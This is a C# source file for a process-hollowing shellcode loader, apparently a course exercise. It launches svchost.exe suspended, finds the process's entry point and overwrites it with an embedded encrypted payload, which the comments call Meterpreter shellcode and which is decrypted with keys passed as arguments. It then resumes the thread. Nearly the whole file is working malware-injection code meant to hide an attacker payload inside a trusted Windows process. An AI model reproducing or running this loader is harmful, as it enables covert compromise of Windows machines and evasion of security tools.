using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollowingExe
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            //This is encryped/shifted using the project
            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
            byte[] buf = new byte[] {
                0x04,0x64,0x6f,0x4b,0xf5,0x68,0x85,0x33,0x13,0x35,0x77,0xc1,0x66,0xb0,0x72,0xe6,0xbf,0xa9,0xca,0x4b,0x27,0xb3,0xba,0xda,0x4b,0x71,0x5a,0xa7,0x01,0x42,0x82,0xb0,0x5e,0xa8,0xb8,0xa4,0x41,0x12,0x65,0x9d,0x61,0xa1,0x78,0x16,0xfb,0x19,0xa4,0x76,0xc1,0xad,0x15,0x61,0x38,0x71,0xdf,0xf9,0x8d,0xf5,0x43,0x8e,0x4f,0x34,0x29,0x6e,0xe2,0xec,0x7e,0xe1,0xba,0x9f,0x11,0x74,0x7d,0x74,0xb3,0x56,0x57,0x51,0x19,0x95,0x7d,0x12,0x2a,0x07,0xe6,0x55,0x78,0x47,0xb3,0xcd,0x3d,0x73,0x92,0x15,0x62,0x1f,0x25,0x21,0xb9,0xd6,0x2d,0x44,0xcf,0xb9,0x58,0x45,0xba,0xe6,0x0f,0xf4,0xd8,0x10,0xa2,0x20,0x4c,0x64,0x99,0x37,0x3f,0x89,0xff,0x8d,0xe7,0x24,0x6a,0x06,0xfe,0x34,0x93,0x49,0x6a,0x6b,0x04,0x4c,0xa4,0xea,0x5b,0x90,0xbd,0xb1,0xf4,0x02,0xb5,0xb0,0x74,0x31,0xcf,0x0e,0x16,0x64,0xc2,0x49,0x60,0x12,0x25,0xfc,0xca,0x31,0x22,0x8d,0xf1,0xa2,0x8b,0x08,0xfd,0x16,0x53,0x32,0x9a,0xbd,0x99,0x20,0x9e,0x24,0x22,0x29,0x36,0xc9,0x2d,0x64,0x0e,0xce,0x95,0x49,0xd2,0x38,0xf1,0x05,0x99,0xbd,0xde,0x95,0xc6,0x60,0x18,0x57,0xf5,0xd7,0xab,0x07,0x3e,0x4c,0x58,0xaa,0x7b,0x46,0xfa,0x46,0xe0,0xba,0x73,0x30,0xcc,0x15,0x67,0x4b,0x92,0x2b,0xfa,0x71,0xc7,0x2a,0xb7,0x40,0xee,0x88,0xf7,0xc1,0xea,0x71,0x33,0x85,0xc8,0x16,0xa8,0x50,0xe5,0x52,0xec,0x28,0x49,0x0f,0x3c,0x0a,0xa3,0xb6,0x67,0xd8,0x7f,0xd2,0x54,0x32,0x43,0xe7,0x8d,0xe4,0xa8,0xeb,0x54,0x54,0xf4,0x99,0x01,0x60,0xb2,0x21,0x1e,0xc3,0x84,0x0f,0x04,0x71,0x11,0x79,0x35,0xad,0xbb,0x1b,0x86,0x28,0xb0,0xfd,0xd5,0x82,0x78,0xe2,0x82,0x72,0x62,0x6b,0xec,0x78,0x59,0x1b,0xac,0x46,0x66,0xbd,0x8f,0x4d,0xf4,0x0a,0xe4,0x82,0x6f,0x95,0x22,0xd0,0x59,0xd5,0x52,0xb4,0xe3,0xce,0x37,0x40,0x0e,0x98,0x3b,0x2e,0x20,0x86,0x9e,0xbe,0x17,0xca,0xe2,0x09,0x68,0xa4,0xce,0x89,0x45,0x4c,0x49,0xeb,0x1a,0xbb,0x3d,0xbc,0x98,0x31,0xba,0x9e,0x59,0x43,0x0e,0xe9,0x18,0x9b,0x46,0xa7,0xc0,0x5c,0xad,0x75,0x7e,0x4d,0x21,0xdf,0xb1,0x85,0xc9,0x1b,0x34,0x77,0xad,0x46,0xb3,0x2a,0xa3,0x93,0xf0,0x70,0x37,0x05,0x10,0x38,0xf3,0xf4,0xf8,0x9c,0x8c,0x7c,0x18,0x82,0xd0,0xef,0xa8,0xba,0xde,0xc7,0x6d,0x01,0xf7,0x84,0xfd,0x29,0x58,0x05,0xbc,0xa6,0x77,0x0c,0x8e,0xbe,0x95,0x9d,0xe1,0x37,0x45,0xea,0x32,0xf7,0xe7,0xd9,0xe8,0xf5,0xca,0x2c,0xf0,0xdb,0x8c,0xed,0x78,0xe5,0x81,0xdc,0x5d,0x44,0x45,0x96,0xa2,0x85,0x74,0x24,0xf3,0x66,0x0b,0x42,0xbc,0x20,0x5e,0xba,0x4e,0x00,0x05,0x11,0xc0,0x3b,0xb0,0x1e,0xd0,0xb6,0xbd,0x93,0xd1,0x5e,0x63,0xba,0x50,0xf8,0x80,0x8b,0xea,0x42,0x3c,0x9d,0xac,0xd4,0xfc,0x72,0xbe,0x8f,0xc9,0x92,0x1f,0xce,0x2b,0xf7,0xde,0xa0,0x05,0x7f,0x0f,0xde,0x98,0xba,0xd6,0xa3,0x9f,0x59,0x01,0xbb,0x31,0x3c,0x59,0x6f,0x8e,0x1b,0x6c,0x93,0xcd,0xe9,0xc4,0x61,0xee,0x47,0xbb,0xce,0x5a,0x58
            };


            buf = PFuncs.CaesarDecrypt(buf, args[0], Convert.FromBase64String(args[1]));

            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
        }
    }
}

